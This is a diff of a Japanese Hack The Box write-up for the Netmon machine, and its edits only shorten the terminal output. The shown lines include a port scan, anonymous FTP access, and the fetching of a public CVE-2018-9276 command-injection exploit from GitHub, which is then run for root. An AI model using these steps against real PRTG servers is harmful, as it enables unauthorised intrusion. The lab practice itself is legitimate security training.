@@ -3,19 +3,7 @@ https://app.hackthebox.com/machines/Netmon
 ## STEP 1
 ftpのanonymousログインが可能
 ```sh
-└─$ rustscan -a 10.129.230.176 --scripts none
-.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
-| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
-| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
-`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
-The Modern Day Port Scanner.
-________________________________________
-: http://discord.skerritt.blog         :
-: https://github.com/RustScan/RustScan :
- --------------------------------------
-TreadStone was here 
-
-[~] The config file is expected to be at "/home/kali/.rustscan.toml"
+└─$ rustscan -a 10.129.230.176 --no-banner --scripts none
 [!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
 [!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
 Open 10.129.230.176:21
@@ -161,15 +149,7 @@ CVE-2018-9276のOSコマンドインジェクションでDLLをrundllで実行�
 ルートフラグゲット！
 ```sh
 └─$ wget https://raw.githubusercontent.com/A1vinSmith/CVE-2018-9276/refs/heads/main/exploit.py
---2025-04-18 02:21:32--  https://raw.githubusercontent.com/A1vinSmith/CVE-2018-9276/refs/heads/main/exploit.py
-Connecting to 192.168.20.37:8080... connected.
-Proxy request sent, awaiting response... 200 OK
-Length: 16049 (16K) [text/plain]
-Saving to: ‘exploit.py’
-
-exploit.py                                                 100%[========================================================================================================================================>]  15.67K  --.-KB/s    in 0.001s  
-
-2025-04-18 02:21:33 (18.0 MB/s) - ‘exploit.py’ saved [16049/16049]
+2025-04-18 02:21:33 URL:https://raw.githubusercontent.com/A1vinSmith/CVE-2018-9276/refs/heads/main/exploit.py [16049/16049] -> "exploit.py" [1]
                                                                                                                                                                                                                           
 └─$ python3.13 exploit.py                                                                                                          
 /home/kali/htb/exploit.py:259: SyntaxWarning: invalid escape sequence '\{'
